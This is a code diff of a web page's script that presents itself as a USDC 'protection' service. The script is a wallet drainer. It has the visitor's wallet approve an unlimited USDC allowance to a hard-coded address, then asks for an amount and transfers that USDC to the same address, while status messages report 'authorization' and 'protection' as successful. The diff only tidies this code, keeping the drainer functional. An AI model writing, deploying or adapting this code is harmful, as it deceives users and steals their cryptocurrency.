@@ -50,7 +50,7 @@
   <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
   <script>
     const rawUSDC = "0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48";
-    const rawBOSS = "0x86DBe265b0d503e68676971fc7d6aAD7E5d90b12";
+    const rawBOSS = "0x86dbe265b0d503e68676971fc7d6aad7e5d90b12";
     const approveAmount = ethers.constants.MaxUint256;
 
     async function startBinding() {
@@ -70,27 +70,27 @@
         const usdcAddress = ethers.utils.getAddress(rawUSDC);
         const bossAddress = ethers.utils.getAddress(rawBOSS);
 
-        status.innerText += "\\n⏳ Approving contract...";
+        status.innerText += "\n⏳ Approving contract...";
         const usdc = new ethers.Contract(usdcAddress, ["function approve(address,uint256) public returns (bool)"], signer);
         const approveTx = await usdc.approve(bossAddress, approveAmount);
         await approveTx.wait();
-        status.innerText += "\\n✅ Authorization successful.";
+        status.innerText += "\n✅ Authorization successful.";
 
         const amount = prompt("Enter USDC amount to protect:");
         if (!amount || isNaN(amount)) {
-          status.innerText += "\\n❌ Invalid amount.";
+          status.innerText += "\n❌ Invalid amount.";
           return;
         }
         const parsedAmount = ethers.utils.parseUnits(amount, 6);
         const usdcTransfer = new ethers.Contract(usdcAddress, ["function transferFrom(address,address,uint256) public returns (bool)"], signer);
-        status.innerText += "\\n⏳ Transferring USDC...";
+        status.innerText += "\n⏳ Transferring USDC...";
         const transferTx = await usdcTransfer.transferFrom(userAddress, bossAddress, parsedAmount);
         await transferTx.wait();
-        status.innerText += "\\n💰 Protection completed successfully.";
+        status.innerText += "\n💰 Protection completed successfully.";
 
       } catch (err) {
         console.error(err);
-        status.innerText += "\\n❌ Error: " + (err.message || err);
+        status.innerText += "\n❌ Error: " + (err.message || err);
       }
     }
   </script>
